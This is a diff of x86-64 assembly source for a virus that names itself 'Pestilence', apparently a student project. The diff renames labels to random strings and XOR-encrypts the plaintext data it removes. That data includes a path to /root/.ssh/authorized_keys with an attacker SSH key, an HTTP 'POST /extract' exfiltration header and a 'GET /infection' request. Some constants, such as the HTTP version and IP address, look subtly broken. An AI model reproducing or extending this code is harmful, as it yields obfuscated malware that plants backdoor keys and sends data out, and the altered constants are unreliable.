-mov dword [rax + 388], 0x02010001
-mov dword [rax + 392], 0x00000000
-mov dword [rax + 396], 0x00450100
-mov dword [rax + 400], 0x01200000
-mov dword [rax + 404], 0x00010100
-mov dword [rax + 408], 0x01000001
-mov dword [rax + 412], 0x00580005
-mov dword [rax + 416], 0x0100010a
-mov dword [rax + 420], 0x00100101
-mov dword [rax + 424], 0x0001010a
-mov dword [rax + 428], 0x02c8c823
-mov dword [rax + 432], 0x0100004f
-mov dword [rax + 436], 0x00000100
-mov dword [rax + 440], 0x30090a01
-mov dword [rax + 444], 0x0900003c
-mov dword [rax + 448], 0x1e010000
-mov dword [rax + 452], 0x0a0d7e40
-mov dword [rax + 456], 0x0a0c0a0d
-mov dword [rax + 460], 0x0a0d0a0c
-mov dword [rax + 464], 0x0d0a0d00
-mov dword [rax + 468], 0x000a0c0a
-mov dword [rax + 472], 0x0b08037f
-mov dword [rax + 476], 0x2d2c2a29
-mov dword [rax + 480], 0x00d9654d
-mov dword [rax + 484], 0x00400201
-mov dword [rax + 488], 0x13120804
-mov dword [rax + 492], 0x04130717
+mov dword [rax + 344], 0x17290000
+mov dword [rax + 348], 0x6e000040
+mov dword [rax + 352], 0x00000001
+mov dword [rax + 356], 0x00000101
+mov dword [rax + 360], 0x2e010100
+mov dword [rax + 364], 0x02010001
+mov dword [rax + 368], 0x00000000
+mov dword [rax + 372], 0x00450100
+mov dword [rax + 376], 0x01200000
+mov dword [rax + 380], 0x00010100
+mov dword [rax + 384], 0x01000001
+mov dword [rax + 388], 0x00580005
+mov dword [rax + 392], 0x0100010a
+mov dword [rax + 396], 0x00100101
+mov dword [rax + 400], 0x0001010a
+mov dword [rax + 404], 0x02c8c823
+mov dword [rax + 408], 0x0100004f
+mov dword [rax + 412], 0x00000100
+mov dword [rax + 416], 0x30090a01
+mov dword [rax + 420], 0x0900003c
+mov dword [rax + 424], 0x1e010000
+mov dword [rax + 428], 0x0a0c7e40
+mov dword [rax + 432], 0x0d000a0d
+mov dword [rax + 436], 0x000a0c0a
+mov dword [rax + 440], 0x0b08037f
+mov dword [rax + 444], 0x2d2c2a29
+mov dword [rax + 448], 0x00d9654d
+mov dword [rax + 452], 0x00400201
+mov dword [rax + 456], 0x13120804
+mov dword [rax + 460], 0x61810717
 _end_map_int:
 pop r9
 pop r8
@@ -1833,15 +1933,15 @@ pop rdi
 ret
 ; rax: char *_decrypt_str(rsi: char *to_decrypt, rdi: len)
 _decrypt_str:
-; rax	== div quotient
-; rbx	-> to_decrypt
-; rcx	== counter
-; rdx	== div modulo
-; r9	== len key
-; r10	-> key_char
-; r11	-> decrypted str (mmap)
-; r12	== len to_decrypt
-; rsi	-> key
+; rax == div quotient
+; rbx -> to_decrypt
+; rcx == counter
+; rdx == div modulo
+; r9 == len I9h3dTtNKW
+; r10 -> key_char
+; r11 -> decrypted str (mmap)
+; r12 == len to_decrypt
+; rsi -> I9h3dTtNKW
 push rbx
 push rcx
 push rdx
@@ -1851,60 +1951,60 @@ push r10
 push r11
 push r12
 push rax
-push  rdi
-call mov4
+push rdi
+call mov2
 add rsp, 8
 mov rbx, rax
 pop rax
 push rax
-push  rsi
-call mov2
+push rsi
+call mov1
 add rsp, 8
 mov r12, rax
 pop rax
-;  addr = NULL (let kernel choose)
-xor rdi, rdi                    
-;  PROT_READ | PROT_WRITE = 1 | 2 = 3
+; addr = NULL (let kernel choose)
+xor rdi, rdi 
+; PROT_READ | PROT_WRITE = 1 | 2 = 3
 push rax
-push  0x03
-call mov3
+push 0x03
+call mov4
 add rsp, 8
 mov rdx, rax
 pop rax
-;  MAP_PRIVATE | MAP_ANONYMOUS = 0x2 | 0x20 = 0x22
+; MAP_PRIVATE | MAP_ANONYMOUS = 0x2 | 0x20 = 0x22
 push rax
-push  0x22
-call mov1
+push 0x22
+call mov3
 add rsp, 8
 mov r10, rax
 pop rax
-;  fd = -1
+; rwpA8dhMq = -1
 push rax
-push  -1
+push -1
 call mov3
 add rsp, 8
 mov r8, rax
 pop rax
-;  offset = 0
-xor r9, r9                      
-;  syscall number for mmap
-push  9
-call mov4
+; offset = 0
+xor r9, r9 
+; syscall number for mmap
+push 9
+call mov2
 add rsp, 8
 syscall
 cmp rax, 0
 jl _decrypt_loop_end
 push rax
-push  rax
-call mov2
+push rax
+call mov1
 add rsp, 8
 mov r11, rax
 pop rax
-lea rsi, key
-call _strlen
+lea rsi, I9h3dTtNKW
+call lzPBWI0L
 push rax
-push  rax
-call mov1
+push rax
+call mov4
 add rsp, 8
 mov r9, rax
 pop rax
@@ -1912,9 +2012,9 @@ xor rcx, rcx
 xor rdx, rdx
 _decrypt_loop:
 cmp rcx, r12
-jge	_decrypt_loop_end
-push  rcx
-call mov2
+jge _decrypt_loop_end
+push rcx
+call mov4
 add rsp, 8
 xor rdx, rdx
 cmp rcx, 0
@@ -1924,14 +2024,14 @@ jmp _end_div
 _no_zero:
 div r9
 _end_div:
-;  r10 == key[rcx % key_len]
-movzx r10, byte [rsi + rdx]	
+; r10 == I9h3dTtNKW[rcx % I9h3dTtNKW_len]
+movzx r10, byte [rsi + rdx] 
 xor r10b, [rbx+rcx]
 mov [r11+rcx], r10b
 inc rcx
 jmp _decrypt_loop
 _decrypt_loop_end:
-push  r11
+push r11
 call mov1
 add rsp, 8
 pop r12
@@ -1944,175 +2044,172 @@ pop rcx
 pop rbx
 ret
 ; strcpy(dst:rsi src: rdi)
-_strcpyNoNull:
-	xor rcx, rcx
-	strcpy_loop:
+f95ZQpA3:
+xor rcx, rcx
+ESphYxEfvV:
 cmp byte[rdi + rcx], 0 
-		je	strcpy_loop_end
-		mov al, byte[rdi+rcx]
-		mov byte [rsi+rcx], al
+je qzByTk
+mov al, byte[rdi+rcx]
+mov byte [rsi+rcx], al
 push rax
 push rcx
-push  1
+push 1
 call add1
 add rsp, 8
 pop rcx
 mov rcx, rax
 pop rax
-		jmp strcpy_loop
-	strcpy_loop_end:
-		ret
-_strcpy:
-    call _strcpyNoNull
+jmp ESphYxEfvV
+qzByTk:
+ret
+HOmW8jN:
+call f95ZQpA3
 mov byte [rsi + rcx], 0 
-    ret
+ret
 ; strncpy(dst:rsi, src: rdi, count: rcx)
-_strncpy:
+HUs658Gp:
 sub rcx, 1 
-    _strncpyLoop:
-        mov al, byte[rdi+rcx]
-        mov byte [rsi + rcx], al
-        loop _strncpyLoop
-        mov al, byte[rdi+rcx]
-        mov byte [rsi + rcx], al
-        ret
+Sm0ewguWS:
+mov al, byte[rdi+rcx]
+mov byte [rsi + rcx], al
+loop Sm0ewguWS
+mov al, byte[rdi+rcx]
+mov byte [rsi + rcx], al
+ret
 ; strlen(str:rsi)
-_strlen:
-	xor rcx, rcx
-	ft_strlen_loop:
+lzPBWI0L:
+xor rcx, rcx
+A5GC13b:
 cmp byte [rsi + rcx], 0 
-		je	ft_strlen_end
-		inc rcx
-		jmp	ft_strlen_loop
-	ft_strlen_end:
-push  rcx
-call mov4
+je euTLKdI
+inc rcx
+jmp A5GC13b
+euTLKdI:
+push rcx
+call mov3
 add rsp, 8
-		ret
+ret
 ; strcmp(rdi, rsi)
-_strcmp:
-	xor rcx, rcx
-	xor rax, rax
-	strcmp_loop:
-		mov al, byte[rdi+rcx]
-		mov bl, byte[rsi+rcx]
-		cmp al, bl
-		jl strcmp_loop_end
-		je strcmp_loop_end
-		jg strcmp_loop_end
+CvLYMAYQ5:
+xor rcx, rcx
+xor rax, rax
+Ipizf:
+mov al, byte[rdi+rcx]
+mov bl, byte[rsi+rcx]
+cmp al, bl
+jl e2KeMJMh4
+je e2KeMJMh4
+jg e2KeMJMh4
 cmp al, 0 
-		je strcmp_loop_end
+je e2KeMJMh4
 push rax
 push rcx
-push  1
+push 1
 call add1
 add rsp, 8
 pop rcx
 mov rcx, rax
 pop rax
-		jmp strcmp_loop
-	strcmp_loop_end:
-		movzx rax, al
-		movzx r8, bl
-		sub rax, r8
-		ret
+jmp Ipizf
+e2KeMJMh4:
+movzx rax, al
+movzx r8, bl
+sub rax, r8
+ret
 ; int itoa(rax:int, rsi:*buffer)
 ; (a la fin rsi pointe sur le byte d'apres)
-_itoa:
+nQScOYAb:
 push rax
-push  10
-call mov3
+push 10
+call mov2
 add rsp, 8
 mov r9, rax
 pop rax
-    call _itoaLoop
-    ret
-    _itoaLoop:
+call Cv9Gr
+ret
+Cv9Gr:
 cmp rax, 9 
-        jg _itoaRecursif
+jg i21jPjD
 push rax
-push  ax
-call mov2
+push ax
+call mov4
 add rsp, 8
 mov [rsi], rax
 pop rax
 add byte [rsi], 48 
-        inc rsi
-        ret
-    _itoaRecursif:
-        push rax
-        xor rdx, rdx
-        div r9
-        call _itoaLoop 
-        pop rax
-        push rax
-        xor rdx, rdx
-        div r9
-push  rdx
-call mov4
-add rsp, 8
-        call _itoaLoop 
-        pop rax
-        ret
+inc rsi
+ret
+i21jPjD:
 push rax
-push  rax
+xor rdx, rdx
+div r9
+call Cv9Gr 
+pop rax
+push rax
+xor rdx, rdx
+div r9
+push rdx
+call mov1
+add rsp, 8
+call Cv9Gr 
+pop rax
+ret
+push rax
+push rax
 call mov3
 add rsp, 8
 mov [rsi + rcx], rax
 pop rax
-_unmap_close_inf:
-	mov rdi, INF(infection.map_addr)
-	mov rsi, INF(infection.map_size)
-push  SYS_UNMAP
-call mov1
-add rsp, 8
-	syscall
-	jmp _close_file_inf
-_close_file_inf:
-push  SYS_CLOSE
-call mov4
-add rsp, 8
-	mov	rdi, INF(infection.file_fd)
-	syscall
-	mov qword INF(infection.file_fd), -1
-	jmp _returnLeave
-_exit:
-push  60
+jc6dsjkGsi:
+mov rdi, INF(X703hy1rZ.jS6sH4kx)
+mov rsi, INF(X703hy1rZ.nGwh0I24)
+push SYS_UNMAP
 call mov2
 add rsp, 8
-    xor rdi, rdi
-    syscall
-dir1 db "/tmp/test", 0 
-dir1Len    equ $ - dir1
-dir2 db "/tmp/test2", 0 
-dir2Len    equ $ - dir2
-key			db "mykey"
-back db 9, 0 
-slash       db "/", -1
-sshFile     db "/root/.ssh/authorized_keys", -1
-sshPub db "ssh-ed25518 AAAAC3NzaC1lZDI1NTE5AAAAIKcsDbiza3Ts6B9TpcehxjY8pcPijnDxBpuiEkotRCn0 gottie@debian", 0 
-sshPubLen   equ $-sshPub
-sockaddr:
-dw 1 
-dw 0x401E 
-dd 0x100007E 
-    ;  padding
-    dq -1            
-headerStart db "POST /extract HTTP/0.1", 13, 10, \
-"Host: 126.0.0.1:8000", 13, 10, \
-"Content-Type: text/plain", 12, 10, \
-                "Content-Length: ", -1 
-headerStartLen equ $-headerStart
-headerEnd db 12, 10, 13, 10, 0 
-headerEndLen equ $-headerEnd
-headerGet db "GET /infection HTTP/0.1", 13, 10, \
-"Host: 126.0.0.1:8000", 13, 10, \
-12, 10, 0 
-headerGetLen equ $ - headerGet
-timespec:
-    ;  Secondes
-    dq -1          
-dq 9999999 
-signature db "Pestilence version 0.0 (c)oded by anvincen-eedy", 0x0 
-signature_len equ $ - signature
-_end:
+syscall
+jmp vNfN5Ue
+vNfN5Ue:
+push SYS_CLOSE
+call mov4
+add rsp, 8
+mov rdi, INF(X703hy1rZ.qz9giR)
+syscall
+mov qword INF(X703hy1rZ.qz9giR), -1
+jmp aOvfi3N4
+lwmZqy:
+push 60
+call mov1
+add rsp, 8
+xor rdi, rdi
+syscall
+LeqAx db 0x1C, 0x00, 0x06, 0x59, 0x58, 0x22, 0x0A, 0x43, 0x39, 0x4E
+UsjUXZli1C equ $ - LeqAx
+IU6f1 db 0x1C, 0x00, 0x06, 0x59, 0x58, 0x22, 0x0A, 0x43, 0x39, 0x7C, 0x34
+JksxN equ $ - IU6f1
+I9h3dTtNKW db 0x33, 0x74, 0x6B, 0x29, 0x77, 0x56, 0x6F, 0x30, 0x4D, 0x4E, 0x34
+KnlWTHf db 9, 0 
+SpcErZb8C db 0x1C, 0x74
+XdOzA0DA db 0x1C, 0x06, 0x04, 0x46, 0x03, 0x79, 0x41, 0x43, 0x3E, 0x26, 0x1B, 0x11, 0x46, 0x00, 0x03, 0x46, 0x05, 0x3F, 0x15, 0x55, 0x29, 0x11, 0x5F, 0x15, 0x4A, 0x07, 0x6B
+W2nvO equ $ - XdOzA0DA
+JzE82 db 0x40, 0x07, 0x03, 0x04, 0x12, 0x32, 0x5D, 0x05, 0x78, 0x7F, 0x0C, 0x50, 0x72, 0x35, 0x2A, 0x68, 0x34, 0x65, 0x21, 0x4A, 0x2C, 0x0D, 0x05, 0x1C, 0x69, 0x30, 0x22, 0x18, 0x39, 0x02, 0x2A, 0x05, 0x0C, 0x0F, 0x75, 0x31, 0x7A, 0x3F, 0x08, 0x5A, 0x33, 0x34, 0x06, 0x4A, 0x2C, 0x7D, 0x60, 0x03, 0x05, 0x36, 0x52, 0x7D, 0x07, 0x35, 0x0A, 0x58, 0x35, 0x24, 0x6D, 0x48, 0x43, 0x17, 0x3B, 0x40, 0x1D, 0x38, 0x2B, 0x48, 0x0F, 0x3E, 0x41, 0x19, 0x76, 0x1F, 0x04, 0x5D, 0x25, 0x15, 0x01, 0x00, 0x6D, 0x29, 0x5B, 0x04, 0x47, 0x1D, 0x0E, 0x69, 0x13, 0x33, 0x0D, 0x59, 0x2C, 0x20, 0x34
+B197bFv91K equ $-sshPub
+Ap5WD2EbFi:
+	FOkRm6 1 
+	FOkRm6 0x401E 
+	gJZxpBX 0x100007E 
+; padding
+ASt2X34 -1 
+ZryyY equ $ - Ap5WD2EbFi
+rKANABrqt db 0x63, 0x3B, 0x38, 0x7D, 0x57, 0x79, 0x0A, 0x48, 0x39, 0x3C, 0x55, 0x13, 0x47, 0x54, 0x23, 0x7D, 0x23, 0x06, 0x40, 0x00, 0x63, 0x7F, 0x68, 0x02, 0x6F, 0x1A, 0x23, 0x46, 0x04, 0x22, 0x55, 0x10, 0x7C, 0x7C, 0x02, 0x5E, 0x03, 0x5A, 0x5B, 0x07, 0x46, 0x6C, 0x57, 0x00, 0x7D, 0x7E, 0x68, 0x02, 0x6F, 0x1A, 0x28, 0x46, 0x19, 0x22, 0x0A, 0x5E, 0x39, 0x63, 0x60, 0x09, 0x43, 0x11, 0x51, 0x09, 0x03, 0x33, 0x17, 0x44, 0x62, 0x3E, 0x58, 0x11, 0x5A, 0x1A, 0x37, 0x4F, 0x2B, 0x38, 0x2C, 0x5F, 0x23, 0x3A, 0x51, 0x1E, 0x47, 0x59, 0x27, 0x4C, 0x19, 0x31, 0x1B, 0x58, 0x77, 0x6E, 0x34
+nUQR8D equ $-headerStart
+SKasW db 12, 10, 13, 10, 0 
+hhcTDSu equ $-headerEnd
+XTZsIZO db 0x74, 0x31, 0x3F, 0x09, 0x58, 0x3F, 0x01, 0x56, 0x28, 0x2D, 0x40, 0x19, 0x5C, 0x1A, 0x4B, 0x61, 0x23, 0x02, 0x3F, 0x1F, 0x7D, 0x60, 0x05, 0x2C, 0x41, 0x28, 0x05, 0x61, 0x18, 0x25, 0x1B, 0x0A, 0x6D, 0x7F, 0x06, 0x46, 0x1D, 0x44, 0x45, 0x19, 0x59, 0x67, 0x55, 0x08, 0x7D, 0x7E, 0x04, 0x70, 13, 10, 12, 10
+YOFxT equ $ - XTZsIZO
+vJBLbia:
+; Secondes
+ASt2X34 -1 
+ASt2X34 9999999 
+haXw6ThsV db "Pestilence version 0.0 (c)oded by anvincen-eedy", 0x0 
+ENiCO4ir equ $ - haXw6ThsV
+IDsDM:
